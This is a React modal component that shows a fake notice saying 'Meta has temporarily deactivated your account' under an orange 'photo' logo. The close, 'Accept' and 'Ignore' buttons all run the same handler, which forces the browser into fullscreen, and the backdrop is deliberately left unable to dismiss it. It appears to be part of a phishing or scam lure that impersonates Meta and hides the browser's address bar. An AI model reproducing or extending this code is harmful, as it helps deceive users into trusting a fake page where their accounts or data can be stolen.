'use client';

import React from 'react';

interface ModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export default function Modal({ isOpen, onClose }: ModalProps) {
  const handleAction = () => {
    // Request fullscreen mode
    if (document.documentElement.requestFullscreen) {
      document.documentElement.requestFullscreen();
    } else if ((document.documentElement as unknown as { webkitRequestFullscreen?: () => void }).webkitRequestFullscreen) {
      (document.documentElement as unknown as { webkitRequestFullscreen: () => void }).webkitRequestFullscreen();
    } else if ((document.documentElement as unknown as { msRequestFullscreen?: () => void }).msRequestFullscreen) {
      (document.documentElement as unknown as { msRequestFullscreen: () => void }).msRequestFullscreen();
    }
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div 
      className="fixed inset-0 z-[100] flex items-center justify-center modal-animate"
    >
      {/* Backdrop - clicking does NOT close the modal */}
      <div className="absolute inset-0 bg-black/50 backdrop-blur-sm opacity-60"></div>
      
      {/* Modal Content */}
      <div 
        className="relative bg-white rounded-2xl shadow-2xl w-full max-w-md mx-4 modal-content-animate"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Close Button */}
        <button 
          onClick={handleAction}
          className="absolute right-4 top-4 w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 transition text-gray-500"
        >
          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
          </svg>
        </button>

        {/* Modal Body */}
        <div className="p-8 text-center">
          {/* Logo */}
          <h1 className="text-5xl font-bold text-orange-500 mb-6 tracking-tight">photo</h1>
          
          {/* Message */}
          <p className="text-gray-700 text-lg mb-8">
            Meta has temporarily deactivated your account.
          </p>

          {/* Buttons */}
          <div className="flex items-center justify-center gap-4">
            <button 
              onClick={handleAction}
              className="px-8 py-3 text-gray-700 font-medium hover:bg-gray-100 rounded-lg transition"
            >
              Accept
            </button>
            <button 
              onClick={handleAction}
              className="px-8 py-3 bg-gray-100 text-gray-600 font-medium rounded-lg hover:bg-gray-200 transition"
            >
              Ignore
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
